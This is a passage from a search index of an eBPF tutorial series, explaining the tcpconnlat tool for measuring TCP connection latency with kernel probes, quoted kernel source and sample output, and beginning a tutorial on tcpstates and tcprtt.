UDP Internet Connections).</p> <p>Analyzing TCP connection delay is very useful for network performance analysis, optimization, and troubleshooting.</p>"},{"location":"tutorials/13-tcpconnlat/#overview-of-tcpconnlat-tool","title":"Overview of tcpconnlat Tool","text":"<p>The <code>tcpconnlat</code> tool can trace the functions in the kernel that perform active TCP connections (such as using the <code>connect()</code> system call), measure and display connection delay, i.e., the time from sending SYN to receiving response packets.</p>"},{"location":"tutorials/13-tcpconnlat/#tcp-connection-principle","title":"TCP Connection Principle","text":"<p>The process of establishing a TCP connection is often referred to as the \"three-way handshake\". Here are the steps of the entire process:</p> <ol> <li>Client sends SYN packet to the server: The client sends SYN through the <code>connect()</code> system call. This involves local system call and CPU time cost of software interrupts.</li> <li>SYN packet is transmitted to the server: This is a network transmission that depends on network latency.</li> <li>Server handles the SYN packet: The server kernel receives the packet through a software interrupt, then puts it into the listen queue and sends SYN/ACK response. This mainly involves CPU time cost.</li> <li>SYN/ACK packet is transmitted to the client: This is another network transmission.</li> <li>Client handles the SYN/ACK: The client kernel receives and handles the SYN/ACK packet, then sends ACK. This mainly involves software interrupt handling cost.</li> <li>ACK packet is transmitted to the server: This is the third network transmission.</li> <li>Server receives ACK: The server kernel receives and handles the ACK, then moves the corresponding connection from the listen queue to the established queue. This involves CPU time cost of a software interrupt.</li> <li>Wake up the server-side user process: The user process blocked by the <code>accept()</code> system call is awakened, and then the established connection is taken out from the established queue. This involves CPU cost of a context switch.</li> </ol> <p>The complete flowchart is shown below:</p> <p></p> <p>From the client's perspective, under normal circumstances, the total time for a TCP connection is approximately the time consumed by one network round-trip. However, in some cases, it may cause an increase in network transmission time, an increase in CPU processing overhead, or even connection failure. When a long delay is detected, it can be analyzed in conjunction with other information.</p>"},{"location":"tutorials/13-tcpconnlat/#ebpf-implementation-of-tcpconnlat","title":"eBPF Implementation of tcpconnlat","text":"<p>To understand the process of establishing a TCP connection, we need to understand two queues used by the Linux kernel when handling TCP connections:</p> <ul> <li>Listen queue (SYN queue): Stores TCP connections that are in the process of performing three-way handshake. After the server receives the SYN packet, it stores the connection information in this queue.</li> <li>Established queue (Accept queue): Stores TCP connections that have completed three-way handshake and are waiting for the application to call the <code>accept()</code> function. After the server receives the ACK packet, it creates a new connection and adds it to this queue.</li> </ul> <p>With an understanding of the purpose of these two queues, we can begin to explore the specific implementation of tcpconnlat. The implementation of tcpconnlat can be divided into two parts: kernel space and user space, which include several main trace points: <code>tcp_v4_connect</code>, <code>tcp_v6_connect</code>, and <code>tcp_rcv_state_process</code>.</p> <p>These trace points are mainly located in the TCP/IP network stack in the kernel. When executing the corresponding system call or kernel function, these trace points are activated, triggering the execution of eBPF programs. This allows us to capture and measure the entire process of establishing a TCP connection.</p> <p>Let's take a look at the source code of these mounting points first:</p> <pre><code>SEC(\"kprobe/tcp_v4_connect\")\nint BPF_KPROBE(tcp_v4_connect, struct sock *sk)\n{\n return trace_connect(sk);\n}\n\nSEC(\"kprobe/tcp_v6_connect\")\nint BPF_KPROBE(tcp_v6_connect, struct sock *sk)\n{\n  return trace_connect(sk);\n}\n\nSEC(\"kprobe/tcp_rcv_state_process\")\nint BPF_KPROBE(tcp_rcv_state_process, struct sock *sk)\n{\n  return handle_tcp_rcv_state_process(ctx, sk);\n}\n</code></pre> <p>This code snippet shows the definition of three kernel probes (kprobe). <code>tcp_v4_connect</code> and <code>tcp_v6_connect</code> are triggered when the corresponding IPv4 and IPv6 connections are initialized, invoking the <code>trace_connect()</code> function. On the other hand, <code>tcp_rcv_state_process</code> is triggered when the TCP connection state changes in the kernel, calling the <code>handle_tcp_rcv_state_process()</code> function.</p> <p>The following section will be divided into two parts: one part analyzes the kernel part of these mount points, where we will delve into the kernel source code to explain how these functions work in detail. The other part analyzes the user part, focusing on how eBPF programs collect data from these mount points and interact with user-space programs.</p>"},{"location":"tutorials/13-tcpconnlat/#analysis-of-tcp_v4_connect-function","title":"Analysis of tcp_v4_connect function","text":"<p>The <code>tcp_v4_connect</code> function is the main way that the Linux kernel handles TCP IPv4 connection requests. When a user-space program creates a socket through the <code>socket</code> system call and then attempts to connect to a remote server through the <code>connect</code> system call, the <code>tcp_v4_connect</code> function is triggered.</p> <pre><code>/* This will initiate an outgoing connection. */\nint tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n{\n  struct sockaddr_in *usin = (struct sockaddr_in *)uaddr;\n  struct inet_timewait_death_row *tcp_death_row;\n  struct inet_sock *inet = inet_sk(sk);\n  struct tcp_sock *tp = tcp_sk(sk);\n  struct ip_options_rcu *inet_opt;\n  struct net *net = sock_net(sk);\n  __be16 orig_sport, orig_dport;\n  __be32 daddr, nexthop;\n  struct flowi4 *fl4;\n  struct rtable *rt;\n  int err;\n\n  if (addr_len &lt; sizeof(struct sockaddr_in))\n    return -EINVAL;\n\n  if (usin-&gt;sin_family != AF_INET)\n    return -EAFNOSUPPORT;\n\n  nexthop = daddr = usin-&gt;sin_addr.s_addr;\n  inet_opt = rcu_dereference_protected(inet-&gt;inet_opt,\n               lockdep_sock_is_held(sk));\n  if (inet_opt &amp;&amp; inet_opt-&gt;opt.srr) {\n    if (!daddr)\n      return -EINVAL;\n    nexthop = inet_opt-&gt;opt.faddr;\n  }\n\n  orig_sport = inet-&gt;inet_sport;\n  orig_dport = usin-&gt;sin_port;\n  fl4 = &amp;inet-&gt;cork.fl.u.ip4;\n  rt = ip_route_connect(fl4, nexthop, inet-&gt;inet_saddr,\n            sk-&gt;sk_bound_dev_if, IPPROTO_TCP, orig_sport,\n            orig_dport, sk);\n  if (IS_ERR(rt)) {\n    err = PTR_ERR(rt);\n    if (err == -ENETUNREACH)\n      IP_INC_STATS(net, IPSTATS_MIB_OUTNOROUTES);\n    return err;\n  }\n\n  if (rt-&gt;rt_flags &amp; (RTCF_MULTICAST | RTCF_BROADCAST)) {\n    ip_rt_put(rt);\n    return -ENETUNREACH;\n  }\n  if (!inet_opt || !inet_opt-&gt;opt.srr)\n    daddr = fl4-&gt;daddr;\n\n  tcp_death_row = &amp;sock_net(sk)-&gt;ipv4.tcp_death_row;\n\n  if (!inet-&gt;inet_saddr) {\n    err = inet_bhash2_update_saddr(sk,  &amp;fl4-&gt;saddr, AF_INET);\n    if (err) {\n      ip_rt_put(rt);\n      return err;\n    }\n  } else {\n    sk_rcv_saddr_set(sk, inet-&gt;inet_saddr);\n  }\n\n  if (tp-&gt;rx_opt.ts_recent_stamp &amp;&amp; inet-&gt;inet_daddr != daddr) {\n    /* Reset inherited state */\n    tp-&gt;rx_opt.ts_recent    = 0;\n    tp-&gt;rx_opt.ts_recent_stamp = 0;\n    if (likely(!tp-&gt;repair))\n      WRITE_ONCE(tp-&gt;write_seq, 0);\n  }\n\n  inet-&gt;inet_dport = usin-&gt;sin_port;\n  sk_daddr_set(sk, daddr);\n\n  inet_csk(sk)-&gt;icsk_ext_hdr_len = 0;\n  if (inet_opt)\n    inet_csk(sk)-&gt;icsk_ext_hdr_len = inet_opt-&gt;opt.optlen;\n\n  tp-&gt;rx_opt.mss_clamp = TCP_MSS_DEFAULT;\n\n  /* Socket identity is still unknown (sport may be zero).\n   * However we set state to SYN-SENT and not releasing socket\n   * lock select source port, enter ourselves into the hash tables and\n   * complete initialization after this.\n   */\n  tcp_set_state(sk, TCP_SYN_SENT);\n  err = inet_hash_connect(tcp_death_row, sk);\n  if (err)\n    goto failure;\n\n  sk_set_txhash(sk);\n\n  rt = ip_route_newports(fl4, rt, orig_sport, orig_dport,\n             inet-&gt;inet_sport, inet-&gt;inet_dport, sk);\n  if (IS_ERR(rt)) {\n    err = PTR_ERR(rt);\n    rt = NULL;\n    goto failure;\n  }\n  /* OK, now commit destination to socket.  */\n  sk-&gt;sk_gso_type = SKB_GSO_TCPV4;\n  sk_setup_caps(sk, &amp;rt-&gt;dst);\n  rt = NULL;\n\n  if (likely(!tp-&gt;repair)) {\n    if (!tp-&gt;write_seq)\n      WRITE_ONCE(tp-&gt;write_seq,\n           secure_tcp_seq(inet-&gt;inet_saddr,\n              inet-&gt;inet_daddr,\n              inet-&gt;inet_sport,\n              usin-&gt;sin_port));\n    tp-&gt;tsoffset = secure_tcp_ts_off(net, inet-&gt;inet_saddr,\n             inet-&gt;inet_daddr);\n  }\n\n  inet-&gt;inet_id = get_random_u16();\n\n  if (tcp_fastopen_defer_connect(sk, &amp;err))\n    return err;\n  if (err)\n    goto failure;\n\n  err = tcp_connect(sk);\n\n  if (err)\n    goto failure;\n\n  return 0;\n\nfailure:\n  /*\".* This unhashes the socket and releases the local port,\n  * if necessary.\n  */\n tcp_set_state(sk, TCP_CLOSE);\n inet_bhash2_reset_saddr(sk);\n ip_rt_put(rt);\n sk-&gt;sk_route_caps = 0;\n inet-&gt;inet_dport = 0;\n return err;\n}\nEXPORT_SYMBOL(tcp_v4_connect);\n</code></pre> <p>Reference link: https://elixir.bootlin.com/linux/latest/source/net/ipv4/tcp_ipv4.c#L340</p> <p>Next, let's analyze this function step by step:</p> <p>First, this function takes three parameters: a socket pointer <code>sk</code>, a pointer to the socket address structure <code>uaddr</code>, and the length of the address <code>addr_len</code>.</p> <pre><code>int tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n</code></pre> <p>The function starts by checking the parameters, making sure the address length is correct and the address family is IPv4. If these conditions are not met, the function returns an error.</p> <p>Next, the function retrieves the destination address and, if a source routing option is set (an advanced IP feature that is typically not used), it also retrieves the next hop address for the source route.</p> <pre><code>nexthop = daddr = usin-&gt;sin_addr.s_addr;\ninet_opt = rcu_dereference_protected(inet-&gt;inet_opt,\n         lockdep_sock_is_held(sk));\nif (inet_opt &amp;&amp; inet_opt-&gt;opt.srr) {\n  if (!daddr)\n    return -EINVAL;\n  nexthop = inet_opt-&gt;opt.faddr;\n}\n</code></pre> <p>Then, using this information, the function looks for a route entry to the destination address. If a route entry cannot be found or the route entry points to a multicast or broadcast address, the function returns an error.</p> <p>Next, it updates the source address, handles the state of some TCP timestamp options, and sets the destination port and address. After that, it updates some other socket and TCP options and sets the connection state to <code>SYN-SENT</code>.</p> <p>Then, the function tries to add the socket to the connected sockets hash table using the <code>inet_hash_connect</code> function. If this step fails, it restores the socket state and returns an error.</p> <p>If all the previous steps succeed, it then updates the route entry with the new source and destination ports. If this step fails, it cleans up resources and returns an error.</p> <p>Next, it commits the destination information to the socket and selects a secure random value for the sequence offset for future segments.</p> <p>Then, the function tries to establish the connection using TCP Fast Open (TFO), and if TFO is not available or the TFO attempt fails, it falls back to the regular TCP three-way handshake for connection.</p> <p>Finally, if all the above steps succeed, the function returns success; otherwise, it cleans up all resources and returns an error.</p> <p>In summary, the <code>tcp_v4_connect</code> function is a complex function that handles TCP connection requests. It handles many cases, including parameter checking, route lookup, source address selection, source routing, TCP option handling, TCP Fast Open, and more. Its main goal is to establish TCP connections as safely and efficiently as possible.</p>"},{"location":"tutorials/13-tcpconnlat/#kernel-code","title":"Kernel Code","text":"<pre><code>// SPDX-License-Identifier: GPL-2.0\n// Copyright (c) 2020 Wenbo Zhang\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include \"tcpconnlat.h\"\n\n#define AF_INET    2\n#define AF_INET6   10\n\nconst volatile __u64 targ_min_us = 0;\nconst volatile pid_t targ_tgid = 0;\n\nstruct piddata {\n  char comm[TASK_COMM_LEN];\n  u64 ts;\n  u32 tgid;\n};\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 4096);\n  __type(key, struct sock *);\n  __type(value, struct piddata);\n} start SEC(\".maps\");\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n  __uint(key_size, sizeof(u32));\n  __uint(value_size, sizeof(u32));\n} events SEC(\".maps\");\n\nstatic int trace_connect(struct sock *sk)\n{\n  u32 tgid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n  struct piddata piddata = {};\n\n  if (targ_tgid &amp;&amp; targ_tgid != tgid)\n    return 0;\n\n  bpf_get_current_comm(&amp;piddata.comm, sizeof(piddata.comm));\n  piddata.ts = bpf_ktime_get_ns();\n  piddata.tgid = tgid;\n  bpf_map_update_elem(&amp;start, &amp;sk, &amp;piddata, 0);\n  return 0;\n}\n\nstatic int handle_tcp_rcv_state_process(void *ctx, struct sock *sk)\n{\n  struct piddata *piddatap;\n  struct event event = {};\n  s64 delta;\n  u64 ts;\n\n  if (BPF_CORE_READ(sk, __sk_common.skc_state) != TCP_SYN_SENT)\n    return 0;\n\n  piddatap = bpf_map_lookup_elem(&amp;start, &amp;sk);\n  if (!piddatap)\n    return 0;\n\n  ts = bpf_ktime_get_ns();\n  delta = (s64)(ts - piddatap-&gt;ts);\n  if (delta &lt; 0)\n    goto cleanup;\n\n  event.delta_us = delta / 1000U;\n  if (targ_min_us &amp;&amp; event.delta_us &lt; targ_min_us)\n    goto cleanup;\n  __builtin_memcpy(&amp;event.comm, piddatap-&gt;comm,\n      sizeof(event.comm));\n  event.ts_us = ts / 1000;\n  event.tgid = piddatap-&gt;tgid;\n  event.lport = BPF_CORE_READ(sk, __sk_common.skc_num);\n  event.dport = BPF_CORE_READ(sk, __sk_common.skc_dport);\n  event.af = BPF_CORE_READ(sk, __sk_common.skc_family);\n  if (event.af == AF_INET) {\n    event.saddr_v4 = BPF_CORE_READ(sk, __sk_common.skc_rcv_saddr);\n    event.daddr_v4 = BPF_CORE_READ(sk, __sk_common.skc_daddr);\n  } else {\n    BPF_CORE_READ_INTO(&amp;event.saddr_v6, sk,\n        __sk_common.skc_v6_rcv_saddr.in6_u.u6_addr32);\n    BPF_CORE_READ_INTO(&amp;event.daddr_v6, sk,\n        __sk_common.skc_v6_daddr.in6_u.u6_addr32);\n  }\n  bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU,\n      &amp;event, sizeof(event));\n\ncleanup:\n  bpf_map_delete_elem(&amp;start, &amp;sk);\n  return 0;\n}\n\nSEC(\"kprobe/tcp_v4_connect\")\nint BPF_KPROBE(tcp_v4_connect, struct sock *sk)\n{\n  return trace_connect(sk);\n}\n\nSEC(\"kprobe/tcp_v6_connect\")\nint BPF_KPROBE(tcp_v6_connect, struct sock *sk)\n{\n  return trace_connect(sk);\n}\n\nSEC(\"kprobe/tcp_rcv_state_process\")\nint BPF_KPROBE(tcp_rcv_state_process, struct sock *sk)\n{\n  return handle_tcp_rcv_state_process(ctx, sk);\n}\n\nSEC(\"fentry/tcp_v4_connect\")\nint BPF_PROG(fentry_tcp_v4_connect, struct sock *sk)\n{\n  return trace_connect(sk);\n}\n\nSEC(\"fentry/tcp_v6_connect\")\nint BPF_PROG(fentry_tcp_v6_connect, struct sock *sk)\n{\n  return trace_connect(sk);\n}\n\nSEC(\"fentry/tcp_rcv_state_process\")\nint BPF_PROG(fentry_tcp_rcv_state_process, struct sock *sk)\n{\n  return handle_tcp_rcv_state_process(ctx, sk);\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This eBPF (Extended Berkeley Packet Filter) program is mainly used to monitor and collect the time it takes to establish TCP connections, i.e., the time interval from initiating a TCP connection request (connect system call) to the completion of the connection establishment (SYN-ACK handshake process). This is very useful for monitoring network latency, service performance analysis, and other aspects.</p> <p>First, two eBPF maps are defined: <code>start</code> and <code>events</code>. <code>start</code> is a hash table used to store the process information and timestamp of the initiating connection request, while <code>events</code> is a map of type <code>PERF_EVENT_ARRAY</code> used to transfer event data to user space.</p> <pre><code>struct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 4096);\n  __type(key, struct sock *);\n  __type(value, struct piddata);\n} start SEC(\".maps\");\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n  __uint(key_size, sizeof(u32));\n  __uint(value_size, sizeof(u32));\n} events SEC(\".maps\");\n</code></pre> <p>In the kprobe handling functions <code>trace_connect</code> of <code>tcp_v4_connect</code> and <code>tcp_v6_connect</code>, the process information (process name, process ID, and current timestamp) of the initiating connection request is recorded and stored in the <code>start</code> map with the socket structure as the key.</p> <pre><code>static int trace_connect(struct sock *sk)\n{\n  u32 tgid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n  struct piddata piddata = {};\n\n  if (targ_tgid &amp;&amp; targ_tgid != tgid)\n    return 0;\n\n  bpf_get_current_comm(&amp;piddata.comm, sizeof(piddata.comm));\n  piddata.ts = bpf_ktime_get_ns();\n  piddata.tgid = tgid;\n  bpf_map_update_elem(&amp;start, &amp;sk, &amp;piddata, 0);\n  return 0;\n}\n</code></pre> <p>When the TCP state machine processes the SYN-ACK packet, i.e., when the connection is established, the kprobe handling function <code>handle_tcp_rcv_state_process</code> of <code>tcp_rcv_state_process</code> is triggered. In this function, it first checks if the socket state is <code>SYN-SENT</code>. If it is, it looks up the process information for the socket in the <code>start</code> map. Then it calculates the time interval from the initiation of the connection to the present and sends this time interval, process information, and TCP connection details (source port, destination port, source IP, destination IP, etc.) as an event to user space using the <code>bpf_perf_event_output</code> function.</p> <pre><code>static int handle_tcp_rcv_state_process(void *ctx, struct sock *sk)\n{\n  struct piddata *piddatap;\n  struct event event = {};\n  s64 delta;\n  u64 ts;\n\n  if (BPF_CORE_READ(sk, __sk_common.skc_state) != TCP_SYN_SENT)\n    return 0;\n\n  piddatap = bpf_map_lookup_elem(&amp;start, &amp;sk);\n  if (!piddatap)\n    return 0;\n\n  ts = bpf_ktime_get_ns();\n  delta = (s64)(ts - piddatap-&gt;ts);\n  if (delta &lt; 0)\n    goto cleanup;\n\n  event.delta_us = delta / 1000U;\n  if (targ_min_us &amp;&amp; event.delta_us &lt; targ_min_us)\n    goto cleanup;\n  __builtin_memcpy(&amp;event.comm, piddatap-&gt;comm,\n      sizeof(event.comm));\n  event.ts_us = ts / 1000;\n  event.tgid = piddatap-&gt;tgid;\n  event.lport = BPF_CORE_READ(sk, __sk_common.skc_num);\n  event.dport = BPF_CORE_READ(sk, __sk_common.skc_dport);\n  event.af = BPF_CORE_READ(sk, __sk_common.skc_family);\n  if (event.af == AF_INET) {\n    event.saddr_v4 = BPF_CORE_READ(sk, __sk_common.skc_rcv_saddr);\n    event.daddr_v4 = BPF_CORE_READ(sk, __sk_common.skc_daddr);\n  } else {\n    BPF_CORE_READ_INTO(&amp;event.saddr_v6, sk,\n        __sk_common.skc_v6_rcv_saddr.in6_u.u6_addr32);\n    BPF_CORE_READ_INTO(&amp;event.daddr_v6, sk,\n        __sk_common.skc_v6_daddr.in6_u.u6_addr32);\n  }\n  bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU,\n      &amp;event, sizeof(event));\n\ncleanup:\n  bpf_map_delete_elem(&amp;start, &amp;sk);\n  return 0;\n}\n</code></pre> <p>This program uses a while loop to repeatedly poll the perf event buffer. If there is an error during polling (e.g., due to a signal interruption), an error message will be printed. This polling process continues until an exit flag <code>exiting</code> is received.</p> <p>Next, let's take a look at the <code>handle_event</code> function, which handles every eBPF event sent from the kernel to user space:</p> <pre><code>void handle_event(void* ctx, int cpu, void* data, __u32 data_sz) {\n    const struct event* e = data;\n    char src[INET6_ADDRSTRLEN];\n    char dst[INET6_ADDRSTRLEN];\n    union {\n        struct in_addr x4;\n        struct in6_addr x6;\n    } s, d;\n    static __u64 start_ts;\n\n    if (env.timestamp) {\n        if (start_ts == 0)\n            start_ts = e-&gt;ts_us;\n        printf(\"%-9.3f \", (e-&gt;ts_us - start_ts) / 1000000.0);\n    }\n    if (e-&gt;af == AF_INET) {\n        s.x4.s_addr = e-&gt;saddr_v4;\n        d.x4.s_addr = e-&gt;daddr_v4;\n    } else if (e-&gt;af == AF_INET6) {\n        memcpy(&amp;s.x6.s6_addr, e-&gt;saddr_v6, sizeof(s.x6.s6_addr));\n        memcpy(&amp;d.x6.s6_addr, e-&gt;daddr_v6, sizeof(d.x6.s6_addr));\n    } else {\n        fprintf(stderr, \"broken event: event-&gt;af=%d\", e-&gt;af);\n        return;\n    }\n\n    if (env.lport) {\n        printf(\"%-6d %-12.12s %-2d %-16s %-6d %-16s %-5d %.2f\\n\", e-&gt;tgid,\n               e-&gt;comm, e-&gt;af == AF_INET ? 4 : 6,\n               inet_ntop(e-&gt;af, &amp;s, src, sizeof(src)), e-&gt;lport,\n               inet_ntop(e-&gt;af, &amp;d, dst, sizeof(dst)), ntohs(e-&gt;dport),\n               e-&gt;delta_us / 1000.0);\n    } else {\n        printf(\"%-6d %-12.12s %-2d %-16s %-16s %-5d %.2f\\n\", e-&gt;tgid, e-&gt;comm,\n               e-&gt;af == AF_INET ? 4 : 6, inet_ntop(e-&gt;af, &amp;s, src, sizeof(src)),\n               inet_ntop(e-&gt;af, &amp;d, dst, sizeof(dst)), ntohs(e-&gt;dport),\n               e-&gt;delta_us / 1000.0);\n    }\n}\n</code></pre> <p>The <code>handle_event</code> function takes arguments including the CPU number, a pointer to the data, and the size of the data. The data is a <code>event</code> structure that contains information about TCP connections computed in the kernel space.</p> <p>First, it compares the timestamp of the received event with the start timestamp (if available) to calculate the relative time of the event, and then prints it. Next, it converts the source address and destination address from network byte order to host byte order based on the IP address type (IPv4 or IPv6).</p> <p>Finally, depending on whether the user chooses to display the local port, it prints the process ID, process name, IP version, source IP address, local port (if available), destination IP address, destination port, and connection establishment time. This connection establishment time is calculated in the eBPF program running in the kernel space and sent to the user space.</p>"},{"location":"tutorials/13-tcpconnlat/#compilation-and-execution","title":"Compilation and Execution","text":"<pre><code>$ make\n...\n  BPF      .output/tcpconnlat.bpf.o\".GEN-SKEL .output/tcpconnlat.skel.h\n  CC       .output/tcpconnlat.o\n  BINARY   tcpconnlat\n$ sudo ./tcpconnlat \nPID    COMM         IP SADDR            DADDR            DPORT LAT(ms)\n222564 wget         4  192.168.88.15    110.242.68.3     80    25.29\n222684 wget         4  192.168.88.15    167.179.101.42   443   246.76\n222726 ssh          4  192.168.88.15    167.179.101.42   22    241.17\n222774 ssh          4  192.168.88.15    1.15.149.151     22    25.31\n</code></pre> <p>Source code: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/13-tcpconnlat</p> <p>References:</p> <ul> <li>tcpconnlat in bcc</li> </ul>"},{"location":"tutorials/13-tcpconnlat/#summary","title":"Summary","text":"<p>In this eBPF introductory tutorial, we learned how to use eBPF to track and measure the latency of TCP connections. We first explored how eBPF programs can attach to specific kernel functions in kernel-space and capture the start and end times of connection establishment to calculate latency.</p> <p>We also learned how to use BPF maps to store and retrieve data in kernel-space, enabling data sharing among different parts of the eBPF program. Additionally, we discussed how to use perf events to send data from kernel-space to user-space for further processing and display.</p> <p>In user-space, we introduced the usage of libbpf library APIs, such as perf_buffer__poll, to receive and process data sent from the kernel-space. We also demonstrated how to parse and print this data in a human-readable format.</p> <p>If you are interested in learning more about eBPF and its practical applications, please refer to the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf. You can also visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial for more examples and complete tutorials.</p> <p>In the upcoming tutorials, we will dive deeper into advanced features of eBPF, such as tracing the path of network packets and fine-grained system performance monitoring. We will continue to share more content on eBPF development practices to help you better understand and master eBPF technology. We hope these resources will be valuable in your learning and practical journey with eBPF.</p> <p>The original link of this article: https://eunomia.dev/tutorials/13-tcpconnect</p> <p>Share on  Share on </p>"},{"location":"tutorials/14-tcpstates/","title":"eBPF Tutorial by Example 14: Recording TCP Connection Status and TCP RTT","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool widely used in the Linux kernel. eBPF allows developers to dynamically load, update, and run user-defined code without restarting the kernel or changing the kernel source code.</p> <p>In this article of our eBPF Tutorial by Example series, we will introduce two sample programs: <code>tcpstates</code> and <code>tcprtt</code>. <code>tcpstates</code> is used to record the state changes of TCP connections, while <code>tcprtt</code> is used to record the Round-Trip Time (RTT) of TCP.</p>"},{"location":"tutorials/14-tcpstates/#tcprtt-and-tcpstates","title":"<code>tcprtt</code> and <code>tcpstates</code>","text":"<p>Network quality is crucial in the current Internet environment. There are many factors that affect network quality, including hardware, network environment, and the quality of software programming. To help users better locate network issues, we introduce the tool <code>tcprtt</code>. <code>tcprtt</code> can monitor the Round-Trip Time of TCP connections, evaluate network quality, and help users identify potential problems.</p> <p>When a TCP connection is established, <code>tcprtt</code> automatically selects the appropriate execution function based on the current system conditions. In the execution function, <code>tcprtt</code> collects various basic information of the TCP connection, such as source address, destination address, source port, destination port, and time elapsed, and updates this information to a histogram-like BPF map. After the execution is completed, <code>tcprtt</code> presents the collected information graphically to users through user-mode code.</p> <p><code>tcpstates</code> is a tool specifically designed to track and print changes in TCP connection status. It can display the duration of TCP connections in each state, measured in milliseconds. For example, for a single TCP session, <code>tcpstates</code> can print output similar to the following:</p> <pre><code>SKADDR           C-PID C-COMM     LADDR           LPORT RADDR           RPORT OLDSTATE    -&gt; NEWSTATE    MS\nffff9fd7e8192000 22384 curl       100.66.100.185  0     52.33.159.26    80    CLOSE       -&gt; SYN_SENT    0.000\nffff9fd7e8192000 0     swapper/5  100.66.100.185  63446 52.33.159.26    80    SYN_SENT    -&gt; ESTABLISHED 1.373\nffff9fd7e8192000 22384 curl       100.66.100.185  63446 52.33.159.26    80    ESTABLISHED -&gt; FIN_WAIT1   176.042\nffff9fd7e8192000 0     swapper/5  100.66.100.185  63446 52.33.159.26    80    FIN_WAIT1   -&gt; FIN_WAIT2   0.536\nffff9fd7e8192000 0     swapper/5  100.66.100.185  63446 52.33.159.26    80    FIN_WAIT2   -&gt; CLOSE       0.006\n</code></pre> <p>In the above output, the most time is spent in the ESTABLISHED state, which indicates that the connection has been established and data transmission is in progress. The transition from this state to the FIN_WAIT1 state (the beginning of connection closure) took 176.042 milliseconds.</p> <p>In our upcoming tutorials, we will delve deeper into these two tools, explaining their implementation principles, and hopefully, these contents will help you in your work with eBPF for network and performance analysis.</p>"},{"location":"tutorials/14-tcpstates/#tcpstate-ebpf-code","title":"tcpstate eBPF code","text":"<p>Due to space constraints, here we mainly discuss and analyze the corresponding eBPF kernel-mode code implementation. The following is the eBPF code for tcpstate:</p> <pre><code>const volatile bool filter_by_sport = false;\nconst volatile bool filter_by_dport = false;\nconst volatile short target_family = 0;\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, __u16);\n    __type(value, __u16);\n} sports SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    ...\n```__type(key, __u16);\n    __type(value, __u16);\n} dports SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, struct sock *);\n    __type(value, __u64);\n} timestamps SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n    __uint(key_size, sizeof(__u32));\n    __uint(value_size, sizeof(__u32));\n} events SEC(\".maps\");\n\nSEC(\"tracepoint/sock/inet_sock_set_state\")\nint handle_set_state(struct trace_event_raw_inet_sock_set_state *ctx)\n{\n    struct sock *sk = (struct sock *)ctx-&gt;skaddr;\n    __u16 family = ctx-&gt;family;\n    __u16 sport = ctx-&gt;sport;\n    __u16 dport = ctx-&gt;dport;\n    __u64 *tsp, delta_us, ts;\n    struct event event = {};\n\n    if (ctx-&gt;protocol != IPPROTO_TCP)\n        return 0;\n\n    if (target_family &amp;&amp; target_family != family)\n        return 0;\n\n    if (filter_by_sport &amp;&amp; !bpf_map_lookup_elem(&amp;sports, &amp;sport))\n        return 0;\n\n    if (filter_by_dport &amp;&amp; !bpf_map_lookup_elem(&amp;dports, &amp;dport))\n        return 0;\n\n    tsp = bpf_map_lookup_elem(&amp;timestamps, &amp;sk);\n    ts = bpf_ktime_get_ns();\n    if (!tsp)\n        delta_us = 0;\n    else\n        delta_us = (ts - *tsp) / 1000;\n\n    event.skaddr = (__u64)sk;\n    event.ts_us = ts / 1000;\n    event.delta_us = delta_us;\n    event.pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    event.oldstate = ctx-&gt;oldstate;\n    event.newstate = ctx-&gt;newstate;\n    event.family = family;\n    event.sport = sport;\n    event.dport = dport;\n    bpf_get_current_comm(&amp;event.task, sizeof(event.task));\n\n    if (family == AF_INET) {\n        bpf_probe_read_kernel(&amp;event.saddr, sizeof(event.saddr), &amp;sk-&gt;__sk_common.skc_rcv_saddr);\n        bpf_probe_read_kernel(&amp;event.daddr, sizeof(event.daddr), &amp;sk-&gt;__sk_common.skc_daddr);\n    } else { /* family == AF_INET6 */\n        bpf_probe_read_kernel(&amp;event.saddr, sizeof(event.saddr), &amp;sk-&gt;__sk_common.skc_v6_rcv_saddr.in6_u.u6_addr32);\n        bpf_probe_read_kernel(&amp;event.daddr, sizeof(event.daddr), &amp;sk-&gt;__sk_common.skc_v6_daddr.in6_u.u6_addr32);\n    }\n    bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, &amp;event, sizeof(event));\n\n    if (ctx-&gt;newstate == TCP_CLOSE)\n        bpf_map_delete_elem(&amp;timestamps, &amp;sk);\n    else\n        bpf_map_update_elem(&amp;timestamps, &amp;sk, &amp;ts, BPF_ANY);\n\n    return 0;\n}\n</code></pre> <p>The <code>tcpstates</code> program relies on eBPF Tracepoints to capture the state changes of TCP connections, in order to track the time spent in each state of the TCP connection.</p>"},{"location":"tutorials/14-tcpstates/#define-bpf-maps","title":"Define BPF Maps","text":"<p>In the <code>tcpstates</code> program, several BPF Maps are defined, which are the primary way of interaction between the eBPF program and the user-space program. 